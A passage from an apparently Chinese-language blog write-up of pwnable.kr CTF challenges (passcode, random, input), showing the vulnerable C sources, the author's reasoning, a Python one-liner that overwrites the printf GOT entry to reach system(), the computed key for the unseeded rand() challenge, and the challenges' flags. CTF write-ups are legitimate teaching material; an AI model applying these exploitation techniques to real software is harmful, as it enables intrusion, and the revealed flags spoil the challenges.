    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">passcode2</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;checking...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">passcode1</span><span class="o">==</span><span class="mi">338150</span> <span class="o">&amp;&amp;</span> <span class="n">passcode2</span><span class="o">==</span><span class="mi">13371337</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Login OK!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Login Failed!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">welcome</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;enter you name : &#34;</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%100s&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome %s!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Toddler&#39;s Secure Login System 1.0 beta.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="n">welcome</span><span class="p">();</span>
    <span class="n">login</span><span class="p">();</span>

    <span class="c1">// something after login...
</span><span class="c1"></span>    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Now I can safely trust you that you have credential :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>gcc编译一下, 果然有warning</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">passcode.c: In function ‘login’:
passcode.c:9:8: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
  scanf(&#34;%d&#34;, passcode1);
        ^
passcode.c:14:15: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
         scanf(&#34;%d&#34;, passcode2);
</code></pre></td></tr></table>
</div>
</div><p>scanf 的参数没有取地址&hellip;这鬼知道我的数据被存到哪儿去了
Welcome 处可以溢出一个字节&hellip;.然而并没有什么卵用, passcode1 和 passcode2 的值看起来完全没有办法改变</p>
<p>顺着以下思路</p>
<p>passcode的值没有变 -&gt; 内容为随机值? -&gt; 说随机也不准确, 内存中这个地方原来是什么就是什么 -&gt;  原来这里是什么值? -&gt;  !是name的值</p>
<p>因为</p>
<p>338150 = 0x000528E6 13371337 = 00CC07C9</p>
<p>那么只要将这两个数字以字符串形式输入就行了</p>
<p>于是 <code>python -c 'print &quot;\xE6\x28\x05\x00\xC9\x07\xCC\x00&quot;'|./passcode</code></p>
<p>果不其然地失败了</p>
<p>仔细想想好像应该加在末尾才对, 试了试还是失败了</p>
<p>又想了想某些程序开了Canary,
除了代码中声明的那些变量可能还有Canary变量在buffer中</p>
<p>emm&hellip;&hellip;还是把文件拖下来用IDA分析一下比较好</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">   welcome参数的栈结构      login函数的栈结构
   | 0x70 | name   |   |      |           |
   |      |        |   | 0x10 | passcode1 |
   | 0x0C | canary |   | 0x0C | passcode2 |
   | 0x00 | ebp    |   | 0x00 | ebp       |
</code></pre></td></tr></table>
</div>
</div><p>呆呆的.jpg</p>
<p>passcode2的位置是原先canary的位置, 那passcode2的值我似乎完全控制不了&hellip;.</p>
<p>不过我可以控制 passcode1 的值, 再搭配没有取地址的 scanf 函数,
我就拥有了任意地址写的能力</p>
<p>然而经验不足还是不知道有这种能力能干啥</p>
<p>Google一番后了解到拥有任意地址写的能力以后我们可以改 PLT 表,
相当于 Hook 任意函数?</p>
<p>那么这个地方我们可以利用 name 让 passcode1 的值为PLT表中 printf 函数项的地址 0x0804A03C</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt; readelf -r passcode

重定位节 &#39;.rel.dyn&#39; 位于偏移量 0x388 含有 2 个条目：
 偏移量     信息    类型              符号值      符号名称
08049ff0  00000606 R_386_GLOB_DAT    00000000   __gmon_start__
0804a02c  00000b05 R_386_COPY        0804a02c   stdin@GLIBC_2.0

重定位节 &#39;.rel.plt&#39; 位于偏移量 0x398 含有 9 个条目：
 偏移量     信息    类型              符号值      符号名称
0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
</code></pre></td></tr></table>
</div>
</div><p>然后在这个地址写入调用system函数的汇编语句的位置 0x080485E3 = 134514147</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">080485</span><span class="nf">E3</span>                 <span class="no">mov</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">esp</span><span class="p">],</span> <span class="no">offset</span> <span class="no">command</span> <span class="c">; &#34;/bin/cat flag&#34;
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">080485</span><span class="no">EA</span>                 <span class="no">call</span>    <span class="no">_system</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">passcode@ubuntu:~$ python -c &#39;print &#34;a&#34; * 96 + &#34;\x00\xA0\x04\x08&#34; + &#34;134514147&#34;&#39;|./passcode
Toddler&#39;s Secure Login System 1.0 beta.
enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
</code></pre></td></tr></table>
</div>
</div><p>flag为 <code>Sorry mom.. I got confused about scanf usage :(</code></p>
<h1 id="random">random</h1>
<blockquote>
<p>Daddy, teach me how to use random value in programming!</p>
<p>ssh <a href="mailto:random@pwnable.kr">random@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>先 <code>cat random.c</code> 看内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">random</span><span class="p">;</span>
    <span class="n">random</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>    <span class="c1">// random value!
</span><span class="c1"></span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">key</span> <span class="o">^</span> <span class="n">random</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span> <span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Good!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Wrong, maybe you should try 2^32 cases.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>获得flag的要求是我输入的 key 和 random 异或起来的值等于 0xdeadbeef</p>
<p>Google一下得知 rand() 在先前没有调用 srand(seed) 时, 会初始化随机数种子为1</p>
<p>那直接写个程序算一算 <code>rand()^0xdeadbeef</code> 是多少就行了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">rand</span><span class="p">()</span> <span class="o">^</span> <span class="mh">0xdeadbeef</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>结果是 -1255736440</p>
<p>运行, 输入, GET FLAG!</p>
<p>flag为 <code>Mommy, I thought libc random is unpredictable...</code></p>
<h1 id="input">input</h1>
<blockquote>
<p>Mom? how can I pass my input to a computer program?</p>
<p>ssh <a href="mailto:input2@pwnable.kr">input2@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome to pwnable.kr</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Let&#39;s see if you know how to give input to program</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Just give me correct inputs then you will get the flag :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="c1">// argv
</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">100</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;A&#39;</span><span class="p">],</span><span class="s">&#34;</span><span class="se">\x00</span><span class="s">&#34;</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;B&#39;</span><span class="p">],</span><span class="s">&#34;</span><span class="se">\x20\x0a\x0d</span><span class="s">&#34;</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 1 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="c1">// stdio
</span><span class="c1"></span>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x0a\x00\xff</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x0a\x02\xff</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 2 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="c1">// env
</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\xca\xfe\xba\xbe</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\xde\xad\xbe\xef</span><span class="s">&#34;</span><span class="p">)))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 3 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="c1">// file
</span><span class="c1"></span>    <span class="n">FILE</span><span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x0a</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span> <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span><span class="o">!=</span><span class="mi">1</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x00\x00\x00</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 4 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="c1">// network
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">sd</span><span class="p">,</span> <span class="n">cd</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">saddr</span><span class="p">,</span> <span class="n">caddr</span><span class="p">;</span>
    <span class="n">sd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">sd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;socket error, tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">saddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">saddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
    <span class="n">saddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;C&#39;</span><span class="p">])</span> <span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">saddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">saddr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;bind error, use another port</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">listen</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">);</span>
    <span class="n">cd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">caddr</span><span class="p">,</span> <span class="p">(</span><span class="n">socklen_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">cd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;accept error, tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span> <span class="n">recv</span><span class="p">(</span><span class="n">cd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\xde\xad\xbe\xef</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 5 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="c1">// here&#39;s your flag
</span><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>题目有五关, 一个个分析吧</p>
<h2 id="第一关">第一关</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// argv
</span><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">100</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;A&#39;</span><span class="p">],</span><span class="s">&#34;</span><span class="se">\x00</span><span class="s">&#34;</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;B&#39;</span><span class="p">],</span><span class="s">&#34;</span><span class="se">\x20\x0a\x0d</span><span class="s">&#34;</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 1 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>通过要求: 要有100个参数, 其中第 &lsquo;A&rsquo; 个为 &ldquo;\x00&rdquo;,
第 &lsquo;B&rsquo; 个为 &ldquo;\x20\x0a\x0d&rdquo;</p>
<p>一开始尝试用shell传递, <code>./input $(python -c &quot;xxx&quot;)</code> 这种,</p>
<p>无果, 于是试着直接用 Python,
但是因惯性思维影响在 Python 中还是继续传 &ldquo;\x00&rdquo;</p>
<p>忘记了空字符串末尾就有一个 &lsquo;\x00&rsquo;了</p>
<p>解题脚本如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;./test&#39;</span><span class="p">,</span> <span class="o">*</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="mi">64</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x20\x0a\x0d</span><span class="s1">&#39;</span><span class="p">,</span> <span class="o">*</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="mi">33</span><span class="p">])</span>

<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>

<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="第二关">第二关</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// stdio
</span><span class="c1"></span><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x0a\x00\xff</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">read</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x0a\x02\xff</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 2 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>分别从stdin和stderr读取四个字符, 要求分别是 &ldquo;\x00\x0a\x00\xff&quot;和 &ldquo;\x00\x0a\x02\xff&rdquo;</p>
